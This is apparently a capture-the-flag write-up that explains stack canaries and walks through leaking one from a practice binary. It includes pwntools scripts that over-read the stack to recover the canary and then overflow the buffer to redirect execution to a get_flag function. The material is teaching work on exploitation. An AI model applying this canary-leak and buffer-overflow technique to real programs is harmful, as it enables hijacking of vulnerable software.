This problem is based around stack canaries. You will notice that if you try to
buffer overflow the problem like normal, you will get a message about stack
smashing. This is due to the stack canary. We can see if a stack canary is
enabled with the command `pwn checksec <binary>`. If a program is compiled with
stack canaries enabled, the below snippets of assembly are added to the
beginning and end of every function call

```
  401222:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
  40122b:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
```

```
  4012f8:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  4012fc:       64 48 33 04 25 28 00    xor    rax,QWORD PTR fs:0x28
  401305:       74 05                   je     40130c <vuln+0xf6>
  401307:       e8 c4 fd ff ff          call   4010d0 <__stack_chk_fail@plt>
```

You can see that at the begginning of the function, some value from `fs:0x28` is
moved onto the stack. Assume that `fs:0x28` is just some random value that we
cannot easily predict, and that it changes every run (If you are curious what it
really is read the end note). At the end of the function, the value from the
stack is compared to the value at `fs:0x28`, and if they are different the code
jumps to `__stack_chk_fail`. The value placed on the stack is called a "stack
canary", and it is used to detect buffer overflows. Normally, code would never
write to that section of the stack (the compiler makes sure not to put any
variables there). The only way the value would ever change then is if there was
a buffer overflow. This is because the canary is between our buffer and the
return address, so we have to overwrite it to overwrite the return address. When
we do overwrite the stack canary it jumps to `__stack_chk_fail`, which prints
out a warning message and exits. Since the program never returns from
`__stack_chk_fail`, our overwritten return address is never used. The easiest
way to get around a stack canary is to leak it. If we can find the value of the
stack canary, we can overwrite the stack canary with itself. That means that
we can pass the canary check at the end of the function and buffer overflow like
normal. 

When we tell the binary the length of our answer, if we give it a length
greater than the length of our answer it will print out values from the stack.
If it goes far enough it will print the canary. Lets run the below script to
print out 128 values on the stack. We can then compare this to the canary value
from gdb to figure out at what offset we can find the canary

```python
from pwn import *
context.terminal = ['konsole','-e']

p = gdb.debug('build/canary')
p.recvline()
p.recvline()
p.sendline('128')
p.recvline()
p.sendline('dummby')
p.recvline()
canary = p.recvline()
print(hexdump(canary))
p.interactive()
```

```
pwndbg> b vuln
pwndbg> c
pwndbg> canary
AT_RANDOM = 0x7ffe64cbb9e9 # points to (not masked) global canary value
Canary    = 0xcc0fea27522fe600
No valid canaries found on the stacks.
pwndbg> c
```

Python output:
```
00000000  64 75 6d 6d  62 79 00 00  65 aa 4a 7b  96 7f 00 00  │dumm│by··│e·J{│····│
00000010  00 00 00 00  00 00 00 00  20 a5 5e 7b  96 7f 00 00  │····│····│ ·^{│····│
00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000030  20 b3 5e 7b  96 7f 00 00  ed 74 4a 7b  96 7f 00 00  │ ·^{│····│·tJ{│····│
00000040  20 a5 5e 7b  96 7f 00 00  fc e9 49 7b  96 7f 00 00  │ ·^{│····│··I{│····│
00000050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000060  a0 b5 cb 64  fe 7f 00 00  00 e6 2f 52  27 ea 0f cc  │···d│····│··/R│'···│
00000070  a0 b5 cb 64  fe 7f 00 00  34 13 40 00  00 00 00 00  │···d│····│4·@·│····│
00000080  0a                                                  │·│
00000081
```

From this we can see that our stack canary can be found at offset 104 (`00 e6 2f
52 27 ea 0f cc`). Remember that the bytes are backwards in memory from the hex
representation due to the little endian format. Now, we can extract the canary
from bytes [104:104+8]. Then, when we use the second read to buffer overflow and
jump to `get_flag`, we just put the canary at position 104. This means that we
will overwrite the canary with itself, bypassing the check

```python
#!/usr/bin/python3

from pwn import *

context.binary = 'canary'

e = ELF('canary')
rop = ROP('canary')
p = process('canary')

p.recvline()
p.recvline()
p.sendline('128')
p.recvline()
p.sendline("dummy")
p.recvline()
canary = p.recvline()
canary = u64(canary[104:104+8])
p.recvline()
p.recvline()

payload = flat({104:canary, 120: e.sym['get_flag']})

p.sendline(payload)
p.recvline()
p.interactive()
```
